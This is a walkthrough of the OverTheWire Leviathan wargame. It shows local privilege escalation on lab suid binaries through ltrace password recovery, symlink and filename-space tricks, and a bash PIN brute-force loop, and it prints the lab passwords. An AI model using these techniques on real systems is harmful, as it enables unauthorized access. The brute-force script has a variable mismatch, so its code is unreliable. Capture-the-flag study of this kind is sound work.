## leviathan wargame
### leviathan0
Connect leviathan0 with ssh
```
$ ssh leviathan.labs.overthewire.org -p 2223 -l leviathan0
leviathan0
```
### leviathan1
Open the *.bookmarks.html* file in *.backup* directory and look for *pass* string
```
$ grep pass .backup/bookmarks.html
...
rioGegei8m
...
```
### leviathan2

I googled about priviledge escalation with suid binaries for about an hour or two but nothing to show for it.
Finally I found this [geekstuff/reverse_engineering_tools](https://www.thegeekstuff.com/2012/03/reverse-engineering-tools/)
I tried the `ltrace` and found that *check* program compares the user input with *strcmp* function
```
$ ltrace ./check
...
strcmp("asdf\n", "sex")
...
```
After providing the correct password suid program spawn a shell with priviledged rights
```
$ id
uid=12002(leviathan2) gid=12001(leviathan1) groups=12001(leviathan1)
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```

### leviathan3
There is a suid program named, it prints files with checking permissions.
Examine the program w,th `ltrace`
```
$ ltrace ./printfile /etc/hostname
```
It checks the access permissions with `access()` function but there is a vulnerability about the `""`
while calling `/bin/cat` program.

Make a file with blank in its name and make a symbolic link with one of its parts
```
$ mkdir /tmp/xx
$ cd /tmp/xx
$ touch test\ pass3
$ ln -s /etc/leviathan_pass/levitahan3 pass3
```
Test the program
```
$ ~/printfile "test pass3"
Ahdiemoo1j
```

### leviathan4

There is a suid program check it out.
```
$ ./level3
Enter the password> aaaaa
bzzzzzzzzap. WRONG
```
Examine with ltrace
```
$ ltrace ./level3
...
strcmp("\n", "snlprintf\n")
...
```
`strcmp()` compares `snlprintf` with user input.
Use it as password;
```
$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
```

### leviathan5
There is a hidden `.trash` directory and a binary ,n this file
When it is executed it prints the 1's and 0's.

```
$ .trash/bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
```
Examine the binary with `ltrace`
```
$ ltrace .trash/bin
...
fopen("/etc/leviathan_pass/leviathan5", "r")
...
```
It opens leviatha5's password file but in binary format
Convert it online or in terminal, password is
```
Tith4cokei
```
### leviathan6

There is a suid program in home directory.

First execute it.
```
$ ./leviathan5
Cannot find /tmp/file.log
```
After that examine it with `ltrace`
```
$ ltrace ./leviathan5
...
fopen("/tmp/file.log", "r")
...
```
It wants to read a file in `/tmp` directory. If a symbolic link is created as same name with pointing to leviathan6 password file, the password can be read. Let's try;
```
$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
$ ./leviathan5
UgaoFee4li
```

### leviathan7
There is a suid program that checks pin code provided by an argumment to the program.
```
$ ./leviathan6 0001
Wrong
```
A simple script to do a brute force attack to this pincode can work.
```bash
#!/bin/bash
for PIN in {0000..9999}
do
	T=$(~/leviathan6 $PIN)
	if [[ $TEST != *"Wrong"* ]];
	then
		echo $TEST
		echo "gotcha  $PIN" | tee /tmp/xx/pass7
		break
	fi
	echo "$TEST $PIN"
	TEST=""
done

```
When the attack script is executed it hangs at *7122*
Try this pincode and *7123* with the suid program.
```
$ ~/leviathan6 7122
Wrong
$ ~/leviathan6 7123
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
```
